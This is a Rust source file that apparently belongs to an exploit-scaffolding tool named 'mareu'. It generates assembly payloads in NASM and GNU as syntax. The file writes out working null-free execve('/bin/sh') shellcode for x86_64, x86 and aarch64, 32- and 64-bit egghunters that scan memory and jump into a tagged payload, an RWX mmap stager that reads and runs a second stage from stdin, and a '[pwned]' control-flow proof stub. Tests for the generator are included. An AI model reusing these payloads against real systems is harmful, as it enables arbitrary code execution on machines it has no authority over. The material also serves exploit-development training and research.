//! Assembly scaffold generation (offline, no AI).
//!
//! Rather than ship a combinatorial pile of `.hbs` files, the asm sources are
//! generated here so each `(artifact, arch, syntax)` triple is correct by
//! construction. Two syntaxes are supported — NASM/Intel and GNU as/AT&T — and
//! `build()` can emit a matched pair.
//!
//! Per the scaffold philosophy (RFC §4.3) every artifact is a starting point:
//! the execve shellcode is null-free and assemble-clean; egghunter/loader carry
//! explicit "verify on target" notes for ABI/syscall-number assumptions.

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Syntax {
    Nasm,
    Gas,
}

impl Syntax {
    fn ext(self) -> &'static str {
        match self {
            Syntax::Nasm => "nasm",
            Syntax::Gas => "s",
        }
    }
    fn label(self) -> &'static str {
        match self {
            Syntax::Nasm => "NASM/Intel",
            Syntax::Gas => "GNU as/AT&T",
        }
    }
}

/// Parse the `--syntax` flag into the list of syntaxes to emit.
pub fn syntaxes_from(flag: &str) -> Vec<Syntax> {
    match flag.to_ascii_lowercase().as_str() {
        "nasm" | "intel" => vec![Syntax::Nasm],
        "gas" | "att" | "at&t" => vec![Syntax::Gas],
        _ => vec![Syntax::Nasm, Syntax::Gas], // "both" / default
    }
}

pub struct Meta<'a> {
    pub artifact: &'a str,
    pub arch: &'a str,
    pub vuln: &'a str,
    pub unsafe_mode: bool,
    pub ai: bool,
    pub model: Option<&'a str>,
    pub timestamp: &'a str,
    pub header_comment: bool,
    /// Egg tag for egghunter (cleaned hex, no `0x`); `None` uses the default.
    pub egg: Option<&'a str>,
}

/// Repeat/truncate a cleaned hex string to exactly `width` hex digits, so the
/// egg fills the arch's tag size without introducing NUL bytes.
fn fill_hex(h: &str, width: usize) -> String {
    let mut s = String::new();
    while s.len() < width {
        s.push_str(h);
    }
    s[..width].to_string()
}

pub struct File {
    pub filename: String,
    pub body: String,
    pub lang: String,
}

/// Map a `--class`/`--type` to one of the asm artifacts.
pub fn resolve_artifact(class: Option<&str>, kind: &str) -> &'static str {
    let c = class.unwrap_or("").to_ascii_lowercase();
    match c.as_str() {
        "shellcode" | "execve" | "sh" | "shell" | "bof" => "shellcode",
        "egghunter" | "egg" => "egghunter",
        "loader" | "stager" | "stage" => "loader",
        "ret2" | "rop" | "win" | "proof" | "syscall" => "ret2",
        _ => match kind {
            "exploit" => "shellcode",
            "harness" | "fuzzer" => "loader",
            _ => "shellcode",
        },
    }
}

/// Build one File per requested syntax. For non-x86 arches NASM does not apply,
/// so those collapse to the GNU as variant.
pub fn build(meta: &Meta, requested: &[Syntax]) -> Vec<File> {
    let x86_family = matches!(meta.arch, "x86_64" | "x86" | "i386" | "amd64");
    let mut syntaxes: Vec<Syntax> = requested
        .iter()
        .copied()
        .map(|s| if !x86_family { Syntax::Gas } else { s })
        .collect();
    syntaxes.dedup();
    if syntaxes.is_empty() {
        syntaxes.push(Syntax::Gas);
    }

    let slug = slug(meta.vuln);
    syntaxes
        .into_iter()
        .map(|syn| {
            let (src, assemble) = source(meta.artifact, meta.arch, syn, meta.egg);
            let body = if meta.header_comment {
                format!("{}\n{src}\n", header(meta, syn, &assemble))
            } else {
                src
            };
            File {
                filename: format!("mareu_asm_{}_{}.{}", meta.artifact, slug, syn.ext()),
                body,
                lang: "asm".into(),
            }
        })
        .collect()
}

fn slug(s: &str) -> String {
    let mut out = String::new();
    for c in s.chars().take(32) {
        if c.is_ascii_alphanumeric() {
            out.push(c.to_ascii_lowercase());
        } else if !out.ends_with('_') {
            out.push('_');
        }
    }
    let t = out.trim_matches('_').to_string();
    if t.is_empty() {
        "stub".into()
    } else {
        t
    }
}

fn header(meta: &Meta, syn: Syntax, assemble: &str) -> String {
    let lines = [
        format!("mareu  scaffold — generated {}", meta.timestamp),
        format!("vuln:   {}", meta.vuln),
        format!("artifact: {} ({})", meta.artifact, syn.label()),
        format!("arch:   {} assumed", meta.arch),
        format!(
            "mode:   {}",
            if meta.unsafe_mode {
                "UNSAFE — aggressive output"
            } else {
                "safe — shellcode/offset tooling"
            }
        ),
        "status: SCAFFOLD — not tested, verify syscall numbers/badchars".to_string(),
        match (meta.ai, meta.model) {
            (true, Some(m)) => format!("--ai:   true ({m}) — verify before use"),
            (true, None) => "--ai:   true — verify before use".to_string(),
            (false, _) => "--ai:   false (template-generated)".to_string(),
        },
        format!("assemble: {assemble}"),
    ];
    match syn {
        // NASM uses ';' line comments.
        Syntax::Nasm => lines
            .iter()
            .map(|l| format!("; {l}"))
            .collect::<Vec<_>>()
            .join("\n"),
        // GNU as: a /* */ block is valid on every target (unlike '#' vs '//').
        Syntax::Gas => format!(
            "/*\n{}\n */",
            lines
                .iter()
                .map(|l| format!(" * {l}"))
                .collect::<Vec<_>>()
                .join("\n")
        ),
    }
}

/// Returns (source, assemble-command).
fn source(artifact: &str, arch: &str, syn: Syntax, egg: Option<&str>) -> (String, String) {
    match artifact {
        "shellcode" => shellcode(arch, syn),
        "egghunter" => egghunter(arch, syn, egg),
        "loader" => loader(arch, syn),
        "ret2" => ret2(arch, syn),
        _ => shellcode(arch, syn),
    }
}

fn unsupported(arch: &str, what: &str, syn: Syntax) -> (String, String) {
    let note = format!(
        "{what} is provided for x86_64 (and x86 where noted). For {arch}, port the \
syscall ABI (syscall numbers, arg registers) — or use --ai --lang asm --arch {arch}."
    );
    let body = match syn {
        Syntax::Nasm => format!("; UNSUPPORTED COMBINATION\n; {note}\n"),
        Syntax::Gas => format!("/* UNSUPPORTED COMBINATION\n   {note} */\n"),
    };
    (body, "see notes".into())
}

// ── execve("/bin/sh") ───────────────────────────────────────────────────────

fn shellcode(arch: &str, syn: Syntax) -> (String, String) {
    match (arch, syn) {
        ("x86_64" | "amd64", Syntax::Nasm) => (
            r#"bits 64
global _start
section .text
_start:
    xor    rdx, rdx                  ; envp = NULL
    xor    rsi, rsi                  ; argv = NULL
    mov    rdi, 0x68732f2f6e69622f   ; "/bin//sh"  (null-free)
    push   rdx                       ; NUL terminator
    push   rdi
    mov    rdi, rsp                  ; rdi -> "/bin//sh"
    push   59                        ; __NR_execve
    pop    rax
    syscall
"#
            .to_string(),
            "nasm -f elf64 sc.nasm -o sc.o && ld sc.o -o sc".into(),
        ),
        ("x86_64" | "amd64", Syntax::Gas) => (
            r#".global _start
.text
_start:
    xorq    %rdx, %rdx                    /* envp = NULL */
    xorq    %rsi, %rsi                    /* argv = NULL */
    movabsq $0x68732f2f6e69622f, %rdi     /* "/bin//sh" */
    pushq   %rdx
    pushq   %rdi
    movq    %rsp, %rdi
    pushq   $59                           /* __NR_execve */
    popq    %rax
    syscall
"#
            .to_string(),
            "as sc.s -o sc.o && ld sc.o -o sc".into(),
        ),
        ("x86" | "i386", Syntax::Nasm) => (
            r#"bits 32
global _start
section .text
_start:
    xor    eax, eax
    push   eax              ; NUL terminator
    push   0x68732f2f       ; "//sh"
    push   0x6e69622f       ; "/bin"
    mov    ebx, esp         ; ebx -> "/bin//sh"
    push   eax              ; envp = NULL
    push   ebx              ; argv = { path, NULL }
    mov    ecx, esp
    xor    edx, edx
    mov    al, 11           ; __NR_execve (32-bit)
    int    0x80
"#
            .to_string(),
            "nasm -f elf32 sc.nasm -o sc.o && ld -m elf_i386 sc.o -o sc".into(),
        ),
        ("x86" | "i386", Syntax::Gas) => (
            r#".global _start
.text
_start:
    xorl   %eax, %eax
    pushl  %eax
    pushl  $0x68732f2f      /* "//sh" */
    pushl  $0x6e69622f      /* "/bin" */
    movl   %esp, %ebx
    pushl  %eax
    pushl  %ebx
    movl   %esp, %ecx
    xorl   %edx, %edx
    movb   $11, %al         /* __NR_execve (32-bit) */
    int    $0x80
"#
            .to_string(),
            "as --32 sc.s -o sc.o && ld -m elf_i386 sc.o -o sc".into(),
        ),
        ("aarch64" | "arm64", _) => (
            r#".global _start
.text
_start:
    /* build "/bin/sh\0" in x1 via movz/movk (no literal pool, no nulls in imm) */
    movz x1, #0x622f                 /* "/b" */
    movk x1, #0x6e69, lsl #16        /* "in" */
    movk x1, #0x732f, lsl #32        /* "/s" */
    movk x1, #0x0068, lsl #48        /* "h\0" */
    str  x1, [sp, #-16]!
    mov  x0, sp                      /* x0 -> path  */
    mov  x1, xzr                     /* argv = NULL */
    mov  x2, xzr                     /* envp = NULL */
    mov  x8, #221                    /* __NR_execve (aarch64) */
    svc  #0
"#
            .to_string(),
            "aarch64-linux-gnu-as sc.s -o sc.o && aarch64-linux-gnu-ld sc.o -o sc".into(),
        ),
        _ => unsupported(arch, "shellcode", syn),
    }
}

// ── access(2) egghunter ─────────────────────────────────────────────────────

fn egghunter(arch: &str, syn: Syntax, egg: Option<&str>) -> (String, String) {
    match (arch, syn) {
        ("x86_64" | "amd64", Syntax::Nasm) => {
            let e = fill_hex(egg.unwrap_or("9090905090905090"), 16);
            (
                format!(
                    "bits 64\n\
; access(2) egghunter. Prepend the 8-byte EGG (0x{e}) TWICE, back-to-back,\n\
; immediately before your real payload (16 bytes total).\n\
; VERIFY: __NR_access=21, -EFAULT low byte=0xf2 on your target.\n\
global _start\n\
section .text\n\
_start:\n\
    xor    rdx, rdx\n\
next_page:\n\
    or     dx, 0x0fff           ; advance to end of page\n\
next_byte:\n\
    inc    rdx\n\
    lea    rdi, [rdx + 4]        ; pathname arg = candidate ptr\n\
    xor    rsi, rsi             ; mode = 0\n\
    push   21\n\
    pop    rax                  ; __NR_access\n\
    syscall\n\
    cmp    al, 0xf2             ; -EFAULT? page unmapped -> skip it\n\
    jz     next_page\n\
    mov    rax, 0x{e} ; EGG\n\
    mov    rdi, rdx\n\
    scasq                       ; first 8 bytes == EGG?\n\
    jne    next_byte\n\
    cmp    qword [rdi], rax     ; second 8 bytes == EGG?\n\
    jne    next_byte\n\
    jmp    rdi                  ; found payload -> execute\n"
                ),
                "nasm -f elf64 egg.nasm -o egg.o && ld egg.o -o egg".into(),
            )
        }
        ("x86_64" | "amd64", Syntax::Gas) => {
            let e = fill_hex(egg.unwrap_or("9090905090905090"), 16);
            (
                format!(
                    ".global _start\n\
.text\n\
/* access(2) egghunter. Prepend the 8-byte EGG (0x{e}) TWICE before your\n\
   payload. VERIFY __NR_access=21 and -EFAULT=0xf2 on target. */\n\
_start:\n\
    xorq   %rdx, %rdx\n\
next_page:\n\
    orw    $0x0fff, %dx\n\
next_byte:\n\
    incq   %rdx\n\
    leaq   4(%rdx), %rdi\n\
    xorq   %rsi, %rsi\n\
    pushq  $21\n\
    popq   %rax              /* __NR_access */\n\
    syscall\n\
    cmpb   $0xf2, %al\n\
    je     next_page\n\
    movabsq $0x{e}, %rax   /* EGG */\n\
    movq   %rdx, %rdi\n\
    scasq\n\
    jne    next_byte\n\
    cmpq   %rax, (%rdi)\n\
    jne    next_byte\n\
    jmp    *%rdi\n"
                ),
                "as egg.s -o egg.o && ld egg.o -o egg".into(),
            )
        }
        ("x86" | "i386", Syntax::Nasm) => {
            let e = fill_hex(egg.unwrap_or("50905090"), 8);
            (
                format!(
                    "bits 32\n\
; skape-style 32-bit access(2) egghunter. Prepend the 4-byte EGG (0x{e})\n\
; TWICE (8 bytes) before your payload. EGG must not collide with normal data.\n\
global _start\n\
section .text\n\
_start:\n\
    xor    edx, edx\n\
next_page:\n\
    or     dx, 0x0fff\n\
next_byte:\n\
    inc    edx\n\
    lea    ebx, [edx + 4]\n\
    push   0x21              ; __NR_access (32-bit)\n\
    pop    eax\n\
    int    0x80\n\
    cmp    al, 0xf2          ; EFAULT\n\
    jz     next_page\n\
    mov    eax, 0x{e}   ; EGG\n\
    mov    edi, edx\n\
    scasd\n\
    jnz    next_byte\n\
    scasd\n\
    jnz    next_byte\n\
    jmp    edi\n"
                ),
                "nasm -f elf32 egg.nasm -o egg.o && ld -m elf_i386 egg.o -o egg".into(),
            )
        }
        _ => unsupported(arch, "egghunter", syn),
    }
}

// ── mmap RWX stager / loader ────────────────────────────────────────────────

fn loader(arch: &str, syn: Syntax) -> (String, String) {
    match (arch, syn) {
        ("x86_64" | "amd64", Syntax::Nasm) => (
            r#"bits 64
; RWX stager: mmap a page, read second-stage bytes from fd 0, jump to it.
; NOTE: not null-free (mov r8,-1) — use for a stager, not an inline payload.
global _start
section .text
_start:
    xor    rdi, rdi              ; addr = NULL
    mov    rsi, 0x1000           ; len  = 4096
    mov    rdx, 7                ; PROT_READ|WRITE|EXEC
    mov    r10, 0x22             ; MAP_PRIVATE|MAP_ANONYMOUS
    mov    r8, -1                ; fd
    xor    r9, r9               ; offset
    push   9
    pop    rax                  ; __NR_mmap
    syscall
    mov    r12, rax             ; r12 = RWX buffer
    xor    rdi, rdi              ; read(0, buf, 0x1000)
    mov    rsi, r12
    mov    rdx, 0x1000
    xor    rax, rax             ; __NR_read
    syscall
    jmp    r12                  ; execute second stage
"#
            .to_string(),
            "nasm -f elf64 loader.nasm -o loader.o && ld loader.o -o loader".into(),
        ),
        ("x86_64" | "amd64", Syntax::Gas) => (
            r#".global _start
.text
/* RWX stager: mmap -> read(0) -> jump. NOTE: not null-free. */
_start:
    xorq   %rdi, %rdi
    movq   $0x1000, %rsi
    movq   $7, %rdx                 /* PROT_RWX */
    movq   $0x22, %r10              /* MAP_PRIVATE|ANON */
    movq   $-1, %r8
    xorq   %r9, %r9
    pushq  $9
    popq   %rax                     /* __NR_mmap */
    syscall
    movq   %rax, %r12
    xorq   %rdi, %rdi
    movq   %r12, %rsi
    movq   $0x1000, %rdx
    xorq   %rax, %rax               /* __NR_read */
    syscall
    jmp    *%r12
"#
            .to_string(),
            "as loader.s -o loader.o && ld loader.o -o loader".into(),
        ),
        _ => unsupported(arch, "loader", syn),
    }
}

// ── ret2 "win" / proof-of-execution stub ────────────────────────────────────

fn ret2(arch: &str, syn: Syntax) -> (String, String) {
    match (arch, syn) {
        ("x86_64" | "amd64", Syntax::Nasm) => (
            r#"bits 64
; ret2-target / proof-of-execution: write(1,"[pwned]\n",8); exit(0).
; Jump here (or ret into _start) to confirm control-flow hijack before
; swapping in a real payload.
global _start
section .text
_start:
    push   1
    pop    rax              ; __NR_write
    push   1
    pop    rdi              ; fd = stdout
    lea    rsi, [rel msg]
    mov    rdx, 8
    syscall
    push   60
    pop    rax              ; __NR_exit
    xor    rdi, rdi
    syscall
section .data
msg: db "[pwned]", 0x0a
"#
            .to_string(),
            "nasm -f elf64 win.nasm -o win.o && ld win.o -o win".into(),
        ),
        ("x86_64" | "amd64", Syntax::Gas) => (
            r#".global _start
.text
/* ret2-target / proof: write(1,"[pwned]\n",8); exit(0). */
_start:
    pushq  $1
    popq   %rax            /* __NR_write */
    pushq  $1
    popq   %rdi            /* stdout */
    leaq   msg(%rip), %rsi
    movq   $8, %rdx
    syscall
    pushq  $60
    popq   %rax            /* __NR_exit */
    xorq   %rdi, %rdi
    syscall
.data
msg: .ascii "[pwned]\n"
"#
            .to_string(),
            "as win.s -o win.o && ld win.o -o win".into(),
        ),
        _ => unsupported(arch, "ret2/proof stub", syn),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn meta<'a>(artifact: &'a str, arch: &'a str) -> Meta<'a> {
        Meta {
            artifact,
            arch,
            vuln: "t",
            unsafe_mode: false,
            ai: false,
            model: None,
            timestamp: "2026-06-08",
            header_comment: true,
            egg: None,
        }
    }

    #[test]
    fn egghunter_uses_supplied_egg() {
        let mut m = meta("egghunter", "x86_64");
        m.egg = Some("deadbeefcafef00d");
        let files = build(&m, &[Syntax::Nasm]);
        assert!(files[0].body.contains("0xdeadbeefcafef00d"));
    }

    #[test]
    fn egg_is_repeated_to_arch_width() {
        let mut m = meta("egghunter", "x86_64");
        m.egg = Some("41424344"); // 4 bytes -> repeated to 8 (16 hex)
        let files = build(&m, &[Syntax::Nasm]);
        assert!(files[0].body.contains("0x4142434441424344"));
    }

    #[test]
    fn both_syntaxes_emit_a_pair_for_x86() {
        let files = build(&meta("shellcode", "x86_64"), &[Syntax::Nasm, Syntax::Gas]);
        assert_eq!(files.len(), 2);
        assert!(files.iter().any(|f| f.filename.ends_with(".nasm")));
        assert!(files.iter().any(|f| f.filename.ends_with(".s")));
    }

    #[test]
    fn aarch64_collapses_to_gas_only() {
        let files = build(&meta("shellcode", "aarch64"), &[Syntax::Nasm, Syntax::Gas]);
        assert_eq!(files.len(), 1);
        assert!(files[0].filename.ends_with(".s"));
        assert!(files[0].body.contains("svc  #0"));
    }

    #[test]
    fn shellcode_is_null_free_immediate() {
        let files = build(&meta("shellcode", "x86_64"), &[Syntax::Nasm]);
        assert!(files[0].body.contains("0x68732f2f6e69622f"));
    }

    #[test]
    fn artifact_resolution() {
        assert_eq!(resolve_artifact(Some("egg"), "poc"), "egghunter");
        assert_eq!(resolve_artifact(Some("rop"), "exploit"), "ret2");
        assert_eq!(resolve_artifact(None, "exploit"), "shellcode");
    }
}
